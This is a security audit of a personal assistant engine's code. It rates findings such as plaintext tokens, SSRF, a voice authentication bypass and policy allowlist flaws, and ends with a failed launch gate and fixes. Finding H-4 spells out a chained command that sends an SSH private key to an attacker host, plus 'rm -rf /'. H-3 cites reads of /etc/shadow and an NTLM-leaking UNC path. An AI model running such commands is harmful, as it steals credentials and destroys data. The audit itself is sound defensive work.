## CRITICAL

### C-1. Mobile API has no TLS — auth tokens and signing keys traverse the wire in plaintext
**File:** `engine/src/jarvis_engine/mobile_api.py:318-333`
**Why it matters:** The server uses `http.server.ThreadingHTTPServer` with zero TLS. Bearer tokens, HMAC signing keys, and all payload data (including personal ops data, phone numbers, medication info) flow as cleartext. Anyone on the same network segment (especially Wi-Fi) can sniff `Authorization: Bearer <token>`, the HMAC signing key material in signed requests, and all ingested personal content.
**Break scenario:** ARP spoof or Wi-Fi packet capture on any shared network → full credential theft → attacker replays/forges all mobile API calls, can pause the daemon, enable gaming mode, ingest false memories.
**Concrete fix:** Wrap the server with `ssl.SSLContext` using a self-signed or Let's Encrypt cert. At minimum, refuse to bind to non-loopback addresses without TLS:
```python
if host not in {"127.0.0.1", "localhost", "::1"}:
    raise RuntimeError("Refusing to serve mobile API on non-loopback address without TLS")
```
The current code only *prints a warning* at line 330-331, which is insufficient.

### C-2. SSRF in calendar ICS URL fetching — DNS rebinding bypasses `_is_safe_calendar_url`
**File:** `engine/src/jarvis_engine/ops_sync.py:240-264`
**Why it matters:** `_is_safe_calendar_url` resolves the hostname and checks if IPs are private. However, DNS rebinding attacks can return a public IP at check time and a private IP when `urlopen` actually connects. The check and the fetch are separate operations with no binding.
**Break scenario:** Attacker sets `JARVIS_CALENDAR_ICS_URL` to a domain that DNS-rebinds to `127.0.0.1` → SSRF to internal services (Ollama on :11434, the mobile API itself, cloud metadata endpoints).
**Concrete fix:** Pin the resolved IP and connect through it directly, or use a custom `HTTPHandler` that resolves once and refuses private IPs at the socket level. Alternatively, disable URL-based calendar fetching entirely and only support local file/JSON.

### C-3. Voice auth bypass — non-execute voice commands run without any authentication
**File:** `engine/src/jarvis_engine/main.py:857-868`
**Why it matters:** Voice auth is only required when `execute=True` or `approve_privileged=True`. But several voice commands with `execute=False` still have real side effects: `runtime_pause`, `runtime_resume`, `safe_mode_on/off`, `gaming_mode_enable/disable` all write state files that control daemon behavior. These are NOT gated by voice auth.
**Break scenario:** Any voice input (no auth WAV required) saying "pause Jarvis" or "safe mode off" changes runtime state, disabling safety controls or pausing the daemon entirely.
**Concrete fix:** Move the voice auth check to cover ALL commands that mutate state, not just `execute`/`approve_privileged`:
```python
state_mutating_intents = {"runtime_pause", "runtime_resume", "runtime_safe_on", "runtime_safe_off",
                          "gaming_mode_enable", "gaming_mode_disable", ...}
if intent in state_mutating_intents and not voice_auth_wav.strip():
    # require voice auth
```

## HIGH

### H-1. Race condition on runtime control and gaming mode state files
**File:** `engine/src/jarvis_engine/runtime_control.py:38-57`, `engine/src/jarvis_engine/mobile_api.py:118-136`
**Why it matters:** `write_control_state` does read→modify→write with no file locking. The mobile API runs in a `ThreadingHTTPServer` and the daemon loop reads/writes from a separate process. Concurrent writes can clobber each other (lost update).
**Break scenario:** Mobile API POST /settings and daemon cycle both update `control.json` simultaneously → one write is silently lost → daemon_paused flag gets reverted to old value.
**Concrete fix:** Use `fcntl.flock` (Unix) or `msvcrt.locking` (Windows) on the state file, or use an atomic write pattern (write to temp file, then `os.replace`).

### H-2. Nonce cache is in-memory only — unbounded growth and no cross-process sharing
**File:** `engine/src/jarvis_engine/mobile_api.py:41-43, 195-208`
**Why it matters:** The nonce cache is a `dict` on the server object. If the process restarts (daemon restart script restarts it), all nonces are lost — previously-used nonces can be replayed within the `REPLAY_WINDOW_SECONDS` (300s) window. Also, `MAX_NONCES = 100_000` but under sustained attack, the "saturation" path at line 201-202 is a crude last-resort that returns 401 to legitimate requests.
**Break scenario:** Attacker captures a signed request, waits for daemon restart (which happens on any crash per `start-jarvis-daemon.ps1`), then replays the request within 5 minutes.
**Concrete fix:** Persist nonces to a file or use an OS-level mechanism. At minimum, document the restart-replay window and consider shortening `REPLAY_WINDOW_SECONDS`.

### H-3. `_load_feed_json_list` path traversal when `JARVIS_ALLOW_EXTERNAL_FEEDS=true`
**File:** `engine/src/jarvis_engine/ops_sync.py:106-117`
**Why it matters:** When `JARVIS_ALLOW_EXTERNAL_FEEDS` is enabled, there is NO validation on the path. An attacker who can set env vars (e.g., through a compromised connector or shell injection) can read arbitrary JSON files from the filesystem.
**Break scenario:** `JARVIS_MEDICATIONS_JSON=/etc/shadow` (or Windows equivalent) → the content is parsed as JSON and, while it would likely fail, the file is still read. More critically, `JARVIS_MEDICATIONS_JSON=\\attacker\share\medications.json` → UNC path triggers NTLM hash leak on Windows.
**Concrete fix:** Even with `JARVIS_ALLOW_EXTERNAL_FEEDS=true`, validate the path is not a UNC path and is within a set of allowed directories.

### H-4. `automation.py` executes shell commands with no sandboxing or chroot
**File:** `engine/src/jarvis_engine/automation.py:109`, `engine/src/jarvis_engine/task_orchestrator.py:411-431`
**Why it matters:** `run_shell_command` executes arbitrary commands. The only protection is the `PolicyEngine` allowlist, which currently only allows `git status`, `git log`, `ollama list`, `ollama ps`. However, the allowlist uses `startswith` matching on a normalized string — `git status; rm -rf /` would match `"git status"`.
**Break scenario:** A crafted action with `command="git status && curl attacker.com/exfil?data=$(cat ~/.ssh/id_rsa)"` passes the policy check because `"git status && curl..."` starts with `"git status"`.
**Concrete fix:** The policy engine must reject commands containing shell metacharacters (`;`, `&&`, `||`, `|`, `` ` ``, `$(`, etc.) or switch to an argv-based allowlist that doesn't go through shell interpretation. Since `run_shell_command` uses `shlex.split` + `shell=False`, the `&&` would actually be passed as a literal arg to git — so the *current* code is accidentally safe. But this is fragile and should be hardened with explicit validation.

### H-5. `connect-bootstrap --auto-open` calls `webbrowser.open` with connector URLs
**File:** `engine/src/jarvis_engine/main.py:607-609`
**Why it matters:** If an attacker can inject a malicious URL into connector definitions (e.g., by corrupting a config file), `webbrowser.open` would launch it. This is a local attack vector but in a daemon context could open phishing pages.
**Break scenario:** Corrupted connector config with `setup_url="javascript:..."` or a phishing URL → auto-opened during daemon autopilot cycle.
**Concrete fix:** Validate URLs are HTTPS with known domains before opening. Currently URLs are hardcoded in `connectors.py` constants, but this should be defense-in-depth.

## MEDIUM

### M-1. Gaming mode state and runtime control JSON files are world-readable
**File:** `engine/src/jarvis_engine/runtime_control.py:54-56`, `engine/src/jarvis_engine/main.py:119-127`
**Why it matters:** State files are created with default permissions. On shared systems, any user can read/modify `control.json` and `gaming_mode.json` to pause the daemon or disable safe mode.
**Concrete fix:** Set file permissions to owner-only (`0o600`) after writing.

### M-2. `_extract_first_phone_number` can be tricked into extracting embedded numbers
**File:** `engine/src/jarvis_engine/main.py:666-672`
**Why it matters:** The regex `(\+?\d[\d\-\s\(\)]{7,}\d)` is very permissive. A voice command like "send text to mom: call me at 5551234567" would extract "5551234567" from the message body rather than the intended number.
**Break scenario:** User says "send text to 555-123-4567: my account number is 9876543210" → SMS is sent to `+19876543210` instead of `+15551234567`.
**Concrete fix:** Extract number from the first segment before ":" delimiter, or require explicit number parameter.

### M-3. No rate limiting on mobile API endpoints
**File:** `engine/src/jarvis_engine/mobile_api.py:47-311`
**Why it matters:** An attacker with a valid (or brute-forced) token can flood `/ingest` or `/settings` with requests. The `events.jsonl` file will grow unbounded, and rapid settings changes could cause state thrashing.
**Concrete fix:** Add per-IP or per-token rate limiting (e.g., 60 requests/minute).

### M-4. `MemoryStore.tail()` reads the entire file to get last N lines
**File:** `engine/src/jarvis_engine/memory_store.py:38-54`
**Why it matters:** For a long-running daemon, `events.jsonl` will grow indefinitely. `tail(5)` reads every line into a deque. At millions of events, this becomes a performance bottleneck.
**Concrete fix:** Seek from end of file, or implement log rotation.

### M-5. Growth tracker history chain validation is O(N) on every audit
**File:** `engine/src/jarvis_engine/growth_tracker.py:294-308`
**Why it matters:** `validate_history_chain` iterates all rows and recomputes SHA-256 for each. Called on every `audit_run`. As history grows, this becomes slow.
**Concrete fix:** Cache validation state or validate only from the last known-good checkpoint.

### M-6. `load_config()` crashes on missing config file with unhandled `FileNotFoundError`
**File:** `engine/src/jarvis_engine/config.py:28-34`
**Why it matters:** `config_path.read_text()` throws if the file doesn't exist. Every command that calls `load_config()` (e.g., `cmd_status`) will crash with an uninformative traceback.
**Concrete fix:** Add a try/except with a sensible default config, or create the config on first run.

### M-7. `connector_permissions.json` stored as unencrypted plaintext
**File:** `engine/src/jarvis_engine/connectors.py:118-121`
**Why it matters:** Connector permissions (including granted scopes and timestamps) are stored in plaintext. While these are not secrets per se, they control authorization state and should be integrity-protected.

## LOW

### L-1. Hardcoded local paths in adapters
**File:** `engine/src/jarvis_engine/adapters.py:47-48, 121-122`
**Why it matters:** Default script paths like `C:\Users\Conner\.codex\skills\imagegen\scripts\image_gen.py` are hardcoded. Won't work for other users or deployments.
**Concrete fix:** Already mitigated by env var overrides, but should log a clear warning when falling back to the hardcoded path.

### L-2. `_parse_ics` is a naive ICS parser vulnerable to malformed input
**File:** `engine/src/jarvis_engine/ops_sync.py:150-176`
**Why it matters:** The parser splits on ":" naively and doesn't handle line continuations (RFC 5545 folding), VTIMEZONE blocks, or escaped characters. Calendar events may be silently dropped or misinterpreted.
**Concrete fix:** Use a proper iCalendar library or document the limitations.

### L-3. Email importance detection is keyword-based with false positives
**File:** `engine/src/jarvis_engine/ops_sync.py:234-237`
**Why it matters:** Subject line containing "security" marks email as "high" importance. A newsletter about "security updates" would be flagged as urgent.
**Concrete fix:** Acceptable for MVP. Consider adding negative keywords or sender-based filtering later.

### L-4. `_build_cube_obj` comment includes raw prompt text
**File:** `engine/src/jarvis_engine/adapters.py:287-288`
**Why it matters:** User prompt text is embedded verbatim in the OBJ file comment. If the prompt contains sensitive information, it persists in the output file.
**Concrete fix:** Truncate or hash the prompt in the comment.

### L-5. Voice command intent matching order creates shadow rules
**File:** `engine/src/jarvis_engine/main.py:888-1079`
**Why it matters:** The `elif` chain means earlier patterns shadow later ones. "send text message" matches "send text" (line 974) before it could match a hypothetical future "message" command. "call" matching (line 999) is overly broad — "recall my calendar" would trigger `phone_place_call`.
**Concrete fix:** Use a more structured intent resolution system rather than linear `elif` with substring matching.

## GATE: FAIL

This codebase is not ready for production launch. The mobile API transmitting credentials in cleartext (C-1), the voice auth bypass on state-mutating commands (C-3), and the SSRF vector (C-2) are each independently sufficient to block a launch.

---

## TOP 5 MUST-FIX ACTIONS (Ordered)

1. **[C-1] Enforce TLS on mobile API or hard-block non-loopback binding.** Personal health data (medications), phone numbers, and auth credentials are exposed on the wire. This is a regulatory liability (HIPAA-adjacent for medications data).

2. **[C-3] Gate ALL state-mutating voice commands behind voice authentication**, not just `execute`/`approve_privileged`. An unauthenticated voice command can currently disable safe mode and unpause the daemon.

3. **[C-2] Fix SSRF in calendar URL fetching.** Either pin resolved IPs or remove URL-based ICS fetching. The current check-then-fetch pattern is bypassable via DNS rebinding.

4. **[H-1] Add file locking or atomic writes for runtime state files.** The mobile API and daemon process write concurrently with no coordination. Use write-to-temp + `os.replace` at minimum.

5. **[H-4] Harden the policy engine** to reject shell metacharacters and audit that `shlex.split` + `shell=False` actually prevents command chaining for all edge cases on Windows (where `shlex.split(posix=False)` behaves differently than on Unix).
